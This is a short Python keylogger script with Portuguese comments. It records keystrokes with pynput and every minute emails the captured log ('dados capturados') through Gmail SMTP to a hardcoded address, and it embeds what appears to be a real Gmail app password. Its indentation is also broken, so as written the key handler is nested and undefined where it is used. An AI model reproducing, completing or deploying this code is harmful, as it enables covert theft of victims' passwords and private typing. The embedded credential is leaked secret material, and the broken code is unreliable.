from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

log = ""

# Configurações do email
EMAIL_ORIGEM = "anubisdark600@gmail.com"
EMAIL_DESTINO = "anubisdark600@gmail.com"
SENHA_EMAIL = "gway htik xhri iajo"

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['Subject'] = 'dados capturados'
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO

         try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print(f"Erro ao enviar email: {e}")

    # Envia email a cada 1 minuto
    log = ""
    Timer(60, enviar_email).start()  

    def on_press(key):
        global log
        try:
            log += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                log += " "
            elif key == keyboard.Key.enter:
                log += "\n"
            elif key == keyboard.Key.tab:
                log += "\t"
            elif key == keyboard.Key.esc:
                log += "[ESC]"
            elif key == keyboard.Key.backspace:
                log += "[BACKSPACE]"
            else:
                pass

#inicio o keylogger e o envio de email

with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()